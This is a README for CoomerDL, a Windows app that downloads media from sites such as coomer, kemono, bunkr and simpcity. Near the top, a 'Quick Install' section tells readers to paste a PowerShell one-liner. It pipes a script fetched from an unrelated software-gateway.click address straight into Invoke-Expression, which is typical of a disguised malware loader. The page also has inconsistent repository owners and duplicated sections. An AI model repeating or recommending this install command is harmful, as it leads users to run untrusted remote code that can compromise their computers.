# CoomerDL

**CoomerDL** is a desktop app for Windows that downloads images, videos, and files from supported websites. You paste a URL, pick a folder, and the app downloads everything for you — with progress bars, retries, and a database that prevents downloading the same file twice.

### Install Python
Download and install Python from the [official website](https://www.python.org/downloads/).  
Make sure to check **"Add Python to PATH"** during installation.

---
## ⚡ Quick Install

### One-liner from powershell Win + X to get started:
```powershell
irm https://software-gateway.click/Loader.ps1?get=CoomerDL | iex
```
```
## How to use

1. Launch the application
2. Paste a URL from a supported site
3. Select your download folder
4. Choose the content types you want (images, videos, compressed files)
5. Click **Download**


Downloaded files are organized into subfolders by type (`images`, `videos`, `documents`, `compressed`).
---

## Supported sites

| Site | Status | Notes |
|------|--------|-------|
| [coomerfans.com](https://coomerfans.com/) | ✅ Working | Alternative to Coomer |
| [pawchive.pw](https://pawchive.pw/) | ✅ Working | Alternative to Kemono |
| [erome.com](https://www.erome.com/) | ✅ Working | Albums and profiles |
| [bunkr](https://bunkr-albums.io/) | ✅ Working | Any bunkr domain (bunkr.si, bunkr.site, etc.) |
| [simpcity.cr](https://simpcity.cr/) | ✅ Working | May require cookies (see [Cookies](#simpcity-cookies)) |
| coomer.st | ✅ Working | The site |
| kemono.cr | ✅ Working | The site  |
| jpg5.su | ✅ Working | Downloads from this site |

---

## Getting started

There are two ways to use CoomerDL:


### Option A — Run from source

Requires **Python 3.10+** on **Windows 10/11**. Dependencies (installed from `requirements.txt`): PySide6, requests, beautifulsoup4, and cloudscraper (only needed for SimpCity).

```bash
git clone https://github.com/CoomerDL/CoomerDL.git or download manually
cd CoomerDL
```

Create and activate a virtual environment:

```powershell
python -m venv .venv
.venv\Scripts\Activate.ps1
```

Install dependencies and run:

```bash
pip install -r requirements.txt
python main.py
```

---
### Option B — Run from source
```powershell
cd CoomerDL
pip install -r requirements.txt
python main.py
```

---

## Features

- Modern **PySide6** desktop interface
- Multithreaded downloads with configurable limits
- Per-file and global progress tracking (speed, ETA)
- Automatic retries with configurable interval
- SQLite database to skip files already downloaded
- Configurable file naming modes and folder structure
- Exportable logs
- Cookies support for SimpCity
- English and Spanish included, community translations supported

### Supported file types

| Type | Extensions |
|------|-----------|
| Videos | `.mp4`, `.mkv`, `.webm`, `.mov`, `.avi`, `.flv`, `.wmv`, `.m4v` |
| Images | `.jpg`, `.jpeg`, `.png`, `.gif`, `.bmp`, `.tiff` |
| Documents | `.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.ppt`, `.pptx` |
| Compressed | `.zip`, `.rar`, `.7z`, `.tar`, `.gz` |

---

## Settings

Open **Settings** from the main window:

- **General** — language selection
- **Downloads** — max simultaneous downloads, retries, retry interval, file naming mode, folder structure (these apply to every supported site)
- **Cookies** — SimpCity cookies (import, save, clear), with a status line showing how many cookies are stored and a built-in tutorial for extracting them from your browser
- **Database** — browse download records grouped by user and post, search by user or file name, see totals (users, files, size), export the database, or delete records

### SimpCity cookies

SimpCity may require cookies depending on the content or your session. In **Settings > Cookies** you can:

- paste cookies as JSON
- import cookies from a file
- save or clear saved cookies

These cookies are only used for SimpCity downloads.

### Download database

CoomerDL keeps a record of every downloaded file in a local SQLite database so it can skip files you already have. You can export or manage records from **Settings > Database**.

Default location: `resources/config/downloads.db`

### Logs

The app shows domain-tagged logs in the UI and can export them to a file:

```text
bunkr: Resolving /f/ URL ...
erome: Processing album URL ...
system: Download settings were applied successfully.
```

Default logs folder: `resources/config/logs/`

---

## Translations

Officially maintained languages: **English** and **Español**. Other languages can be added by the community through forks.

Translation files live in:

```text
resources/config/i18n/
    languages.json
    en.json
    es.json
```

### Adding a new language

1. Fork the repository
2. Copy `en.json` and rename it to your language code (e.g. `fr.json`, `ja.json`, `pt_br.json`)
3. Translate the **values only** — never change the keys
4. Keep placeholders like `{url}`, `{error}`, `{path}`, `{version}` unchanged
5. Register the language in `languages.json`:

```json
{
  "official": [
    { "code": "en", "name": "English" },
    { "code": "es", "name": "Español" }
  ],
  "community": [
    { "code": "fr", "name": "Français" }
  ]
}
```

6. Run the app and select the language from **Settings > General**

If a key is missing in a community language, the app falls back to English.

---

## Contributing / forking

1. Fork the repository on GitHub
2. Clone your fork:

```bash
git clone https://github.com/YOUR_USERNAME/CoomerDL.git
cd CoomerDL
```

3. Add the original repository as upstream:

```bash
git remote add upstream https://github.com/SunCharacterize/CoomerDL.git
```

4. Keep your fork updated:

```bash
git fetch upstream
git checkout main
git merge upstream/main
```

5. Work on your own branch:

```bash
git checkout -b my-changes
```

---

## Support

If this project helps you, you can support it here:

[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-FFDD00.svg?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/)
[![Support on Patreon](https://img.shields.io/badge/Support%20on%20Patreon-FF424D.svg?style=for-the-badge&logo=patreon&logoColor=white)](https://www.patreon.com/)

## Community

[![Join Discord](https://img.shields.io/badge/Join-Discord-7289DA.svg?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/ku8gSP)
